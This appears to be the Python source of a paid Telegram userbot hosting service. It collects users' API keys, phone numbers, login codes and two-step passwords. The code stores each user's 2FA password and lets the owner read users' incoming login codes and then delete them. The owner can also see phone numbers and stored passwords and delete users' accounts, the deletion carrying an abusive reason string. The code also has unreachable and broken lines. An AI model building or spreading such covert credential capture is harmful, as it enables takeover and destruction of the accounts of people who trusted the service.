import asyncio
import importlib
from datetime import datetime
from time import time

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.raw import functions
from pyrogram.types import *

from PyroUbot import *


async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        return await bot.send_message(
            user_id,
            "<b>anda suda membuat userbot\n\njika userbot anda tidak bisa di gunakan pencet: /control</b>",
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("🗑️ ᴛᴜᴛᴜᴘ 🗑️", callback_data="0_cls")],
        ]
    elif user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("➡️ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="bayar_dulu")],
            [InlineKeyboardButton("❌ ʙᴀᴛᴀʟᴋᴀɴ", callback_data=f"home {user_id}")],
        ]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            f"""
<b>❌ tidak bisa membuat userbot!</b>

<b>📚 karena maksimal userbot sudah {Fonts.smallcap(str(len(ubot._ubot)))} terbatas</b>

<b>☎️ silahkan hubungi: <a href=tg://openmessage?user_id={OWNER_ID}>admin</a> jika ingin membuat userbot</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("➡️ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="add_ubot")]]
        await callback_query.message.delete()
        return await bot.send_message(
            user_id,
            """
<b>✅ untuk membuat userbot siapkan bahan

    • <code>api_id</code>: dapatkan dari  my.telegram.org
    • <code>api_hash</code>: dapatkan dari my.telegram.org
    • <code>phone_number</code>: nomer hp akun telegram 

☑️ jika sudah tersedia klik tombol di bawa</b>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def payment_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    await callback_query.message.delete()
    return await bot.send_message(
        user_id,
        MSG.TEXT_PAYMENT(25, 25, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def bikin_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    try:
        await callback_query.message.delete()
        api = await client.ask(
            user_id,
            (
                "<b>silahkan masukan api_id</b>\n"
                "\n<b>gunakan /cancel untuk membatalkan userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await client.send_message(user_id, "pembatalan otomatis")
    if await is_cancel(callback_query, api.text):
        return
    api_id = api.text
    try:
        hash = await client.ask(
            user_id,
            (
                "<b>silahkan masukan api_hash</b>\n"
                "\n<b>gunakan /cancel untuk membatalkan userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await client.send_message(user_id, "pembatalan otomatis")
    if await is_cancel(callback_query, hash.text):
        return
    api_hash = hash.text
    try:
        phone = await bot.ask(
            user_id,
            (
                "<b>masuk nomer telpon telegram anda dengan.\ncontoh: +628xxxxxxx</b>\n"
                "\n<b>gunakan /cancel untuk membatalkan userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "pembatalan otomatis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=api_id,
        api_hash=api_hash,
        in_memory=False,
        workdir="./sessions/"
    )
    get_otp = await bot.send_message(user_id, "<b>ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ</a> ʀᴇsᴍɪ",
            SentCodeType.SMS: "sᴍs ᴀɴᴅᴀ",
            SentCodeType.CALL: "ᴘᴀɴɢɢɪʟᴀɴ ᴛᴇʟᴘᴏɴ",
            SentCodeType.FLASH_CALL: "ᴘᴀɴɢɢɪʟᴀɴ ᴋɪʟᴀᴛ ᴛᴇʟᴇᴘᴏɴ",
            SentCodeType.FRAGMENT_SMS: "ꜰʀᴀɢᴍᴇɴᴛ sᴍs",
            SentCodeType.EMAIL_CODE: "ᴇᴍᴀɪʟ ᴀɴᴅᴀ",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                f"<b>silahkan cek kode otp dari {sent_code[code.type]}. kirim kode otp disini baca format .</b>\n"
                "\njika kode otp adalah <ᴄᴏᴅᴇ>12345</ᴄᴏᴅᴇ> tolong <b>[ tambahkan spasi]</b> kirimkan seperti ini <code>1 2 3 4 5</code>\n"
                "\n<b>gunakan /cancel untuk membatalkan userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "waktu telah habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>akun anda telah mengaktifkan verifikasi dua langka. silahkan kirim password.\n\ngunakan /cancel untuk membatalkan userbot</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "pembatalan otomatis")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "sedang memproses....\n\nsilahkan tunggu sebentar",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        await rem_two_factor(new_client.me.id)
        return await bot_msg.edit(
            "<b>ʜᴀʀᴀᴘ ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅɪ ᴀᴋᴜɴ ᴀɴᴅᴀ sᴀᴀᴛ ɪɴɪ ᴅᴀɴ ʙᴜᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴅᴀʀɪ ᴀᴋᴜɴ ʟᴀɪɴ</>"
        )
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string,
    )
    await set_uptime(new_client.me.id, time())
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
    text_done = f"<b>🔥 {bot.me.mention} berhasil diaktifkan di akun: <a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b> "
    await bot_msg.edit(text_done)
    try:
        await new_client.join_chat("TaniSuport")
    except UserAlreadyParticipant:
        pass
    await remove_prem(user_id)
    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""
<b>❏ userbot diaktifkan</b>
<b> ├ akun:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ id:</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ 📁",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )


async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
    )


async def broadcast_bot(client, message):
    msg = await message.reply("<b>sedang diproses tunggu sebentar </b>", quote=True)
    done = 0
    if not message.reply_to_message:
        return await msg.edit("<b>mohon balas pesan</b>")
    for x in ubot._ubot:
        try:
            await x.unblock_user(bot.me.username)
            await message.reply_to_message.forward(x.me.id)
            done += 1
        except Exception:
            pass
    return await msg.edit(f"✅ berhasil mengirim pesan {done} ubot")
    

async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(
            Button.userbot(ubot._ubot[count].me.id, count)
        ),
    )


async def tools_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            Button.userbot(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 ɴᴏᴍᴇʀ ᴛᴇʟᴇᴘᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 ᴋᴏᴅᴇ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(X.me.id, int(query[1]))
                ),
            )
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(Button.deak(X.me.id, int(query[1])))
        )
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            MSG.DEAK(X),
            reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[1]))),
        )


async def cek_userbot_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
    except:
        return await callback_query.answer("✅ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)


async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rm_all(X.me.id)
            await rem_pref(X.me.id)
            await remove_ubot(X.me.id)
            await rem_uptime(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(
                f"✅ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ", True
            )
            await callback_query.edit_message_text(
                await MSG.USERBOT(0),
                reply_markup=InlineKeyboardMarkup(
                    Button.userbot(ubot._ubot[0].me.id, 0)
                ),
            )
            await bot.send_message(
                LOGS_MAKER_UBOT,
                MSG.EXPIRED_MSG_BOT(X),
                reply_markup=InlineKeyboardMarkup(Button.expired_button_bot()),
            )
            return await bot.send_message(
                X.me.id, "<b>💬 ᴍᴀsᴀ ᴀᴋᴛɪꜰ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ʙᴇʀᴀᴋʜɪʀ"
            )


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<b>ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs!</b>"
        )
        return True
    return False


async def status_callback_handler(client, callback_query):
    user_id = callback_query.from_user.id
    username = callback_query.from_user.username
    name = callback_query.from_user.first_name + (" " + callback_query.from_user.last_name if callback_query.from_user.last_name else "")
    uptime = await get_time(time() - start_time)
    text = ""

    ubot_aktif_status = "ᴀᴋᴛɪᴠᴀᴛᴇᴅ✅" if user_id in ubot._get_my_id else "ʙᴇʟᴜᴍ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ❎"
    ubot_status = "ᴘʀᴇᴍɪᴜᴍ🇲🇨" if user_id in ubot._get_my_id else "ʙᴇʟᴜᴍ ɴʏᴀʟᴀ❎"
    
    exp = await get_expired_date(user_id) if user_id in ubot._get_my_id else None
    waktu = exp.strftime("%d-%m-%Y") if exp else "ɴᴏɴᴇ"
    prefix = ", ".join(ubot._prefix.get(user_id, [".", ",", ":", ";", "!"]))
    
    text = f"""
<b>🔴sᴛᴀᴛᴜs ᴜʙᴏᴛ </b>
  <b>ᴜʙᴏᴛ sᴛᴀᴛᴜs:</b> {ubot_status}
  <b>ᴜʙᴏᴛ ᴀᴋᴛɪғ sᴛᴀᴛᴜs:</b> {ubot_aktif_status}
  <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{username}
  <b>ɪᴅ ᴘᴇɴɢɢᴜɴᴀ:</b> {user_id}
  <b>ɴᴀᴍᴇ:</b> {name}
  <b>ᴇxᴘɪʀᴇᴅ_ᴏɴ:</b> {waktu}
  <b>ʙᴏᴛ_ᴜᴘᴛɪᴍᴇ:</b> {uptime}
  <b>ᴘʀᴇғɪx:<b> {prefix}
"""

    buttons = [
        [InlineKeyboardButton("💵 Beli Userbot", callback_data=f"bahan")],
        [InlineKeyboardButton("🔙 Kembali", callback_data=f"home {user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(buttons)

    try:
        await callback_query.message.edit_text(text, reply_markup=reply_markup)
    except pyrogram.errors.exceptions.forbidden_403 as e:
        await callback_query


async def status_command_handler(_, message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    name = message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else "")
    uptime = await get_time(time() - start_time)
    
    ubot_aktif_status = "ᴀᴋᴛɪᴠᴀᴛᴇᴅ✅" if user_id in ubot._get_my_id else "ʙᴇʟᴜᴍ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ❎"
    ubot_status = "ᴘʀᴇᴍɪᴜᴍ🇲🇨" if user_id in ubot._get_my_id else "ʙᴇʟᴜᴍ ɴʏᴀʟᴀ❎"
    
    exp = await get_expired_date(user_id) if user_id in ubot._get_my_id else None
    waktu = exp.strftime("%d-%m-%Y") if exp else "ɴᴏɴᴇ"
    prefix = ", ".join(ubot._prefix.get(user_id, [".", ",", ":", ";", "!"]))
   
    text = f"""
<b>🔴sᴛᴀᴛᴜs ᴜʙᴏᴛ </b>
  <b>ᴜʙᴏᴛ sᴛᴀᴛᴜs:</b> {ubot_status}
  <b>ᴜʙᴏᴛ ᴀᴋᴛɪғ sᴛᴀᴛᴜs:</b> {ubot_aktif_status}
  <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{username}
  <b>ɪᴅ ᴘᴇɴɢɢᴜɴᴀ:</b> {user_id}
  <b>ɴᴀᴍᴇ:</b> {name}
  <b>ᴇxᴘɪʀᴇᴅ_ᴏɴ:</b> {waktu}
  <b>ʙᴏᴛ_ᴜᴘᴛɪᴍᴇ:</b> {uptime}
  <b>ᴘʀᴇғɪx:<b> {prefix}
"""

    buttons = [
        [InlineKeyboardButton("💵 Beli Userbot", callback_data="bahan")],
    ]
    reply_markup = InlineKeyboardMarkup(buttons)

    await message.reply_text(text, reply_markup=reply_markup)
